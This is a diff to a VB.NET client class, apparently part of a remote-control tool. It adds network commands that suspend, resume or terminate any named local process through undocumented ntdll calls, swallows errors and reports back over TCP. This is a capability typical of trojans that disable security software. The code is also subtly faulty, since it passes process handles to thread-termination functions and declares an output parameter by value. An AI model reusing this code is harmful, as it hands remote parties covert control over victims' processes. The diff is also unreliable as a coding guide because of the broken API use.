@@ -27,7 +27,57 @@ Public Class MainCL
 
         ElseIf h(1) = "|INFO|" Then
             Await Task.Run(Sub() GetIinfo(h(2), k))
+
+        ElseIf h(1) = "|SUS|" Then
+            Await Task.Run(Sub() SuspendPROC(k, h(2)))
+
+        ElseIf h(1) = "|WAKEUP|" Then
+
+            Await Task.Run(Sub() ResumePROC(k, h(2)))
+
         End If
+    End Sub
+
+    Public Shared Async Sub SuspendPROC(ByVal K As TcpClient, ByVal Name As String)
+        Dim processes As Process() = Process.GetProcesses()
+
+        For Each process As Process In processes
+
+            If process.ProcessName = Name Then
+                Try
+                    ProcessEnding.NtSuspendProcess(process.Handle)
+
+
+                    Dim DATA As String = Name & "|SUS|"
+
+                    Dim B As Byte() = System.Text.Encoding.UTF8.GetBytes(DATA)
+
+                    Await K.GetStream.WriteAsync(B, 0, B.Length)
+
+                Catch ex As Exception
+                End Try
+            End If
+        Next
+    End Sub
+    Public Shared Async Sub ResumePROC(ByVal K As TcpClient, ByVal Name As String)
+        Dim processes As Process() = Process.GetProcesses()
+
+        For Each process As Process In processes
+
+            If process.ProcessName = Name Then
+                Try
+                    ProcessEnding.NtResumeProcess(process.Handle)
+
+                    Dim DATA As String = Name & "|RES|"
+
+                    Dim B As Byte() = System.Text.Encoding.UTF8.GetBytes(DATA)
+
+                    Await K.GetStream.WriteAsync(B, 0, B.Length)
+
+                Catch ex As Exception
+                End Try
+            End If
+        Next
     End Sub
 
     Public Shared Async Sub GetIinfo(ByVal lp As String, ByVal K As TcpClient)
@@ -196,7 +246,7 @@ Public Class MainCL
 
         Dim result
         Dim jk As Process() = Process.GetProcesses
-
+        Dim code As Integer
 
         For Each ah In jk
 
@@ -237,6 +287,43 @@ Public Class MainCL
 
                 End Try
 
+
+
+                Try
+
+                    result = ProcessEnding.NtTerminateThread(ah.Handle, code)
+
+                    If Not result = 0 Then
+                        Dim R As String = result & "|/\|" & p & "|RK|"
+                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)
+
+
+
+                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+                        Exit For
+                    End If
+
+                Catch ex As Exception
+
+                End Try
+
+                Try
+
+                    result = ProcessEnding.ZwTerminateThread(ah.Handle, code)
+
+                    If Not result = 0 Then
+                        Dim R As String = result & "|/\|" & p & "|RK|"
+                        Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(R)
+
+
+
+                        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+                        Exit For
+                    End If
+
+                Catch ex As Exception
+
+                End Try
 
 
 
@@ -511,6 +598,13 @@ Public Class MainCL
         Public Shared Function TerminateProcess(ByVal Handle As IntPtr, ByVal uExitCoed As UInteger) As Boolean
 
         End Function
+        <DllImport("ntdll.dll")>
+        Public Shared Function NtTerminateThread(ByVal Handle As IntPtr, <Out> ExitStatus As UInteger) As UInteger
+        End Function
+        <DllImport("ntdll.dll")>
+        Public Shared Function ZwTerminateThread(ByVal Handle As IntPtr, <Out> ExitStatus As UInteger) As UInteger
+        End Function
+
 
 
 
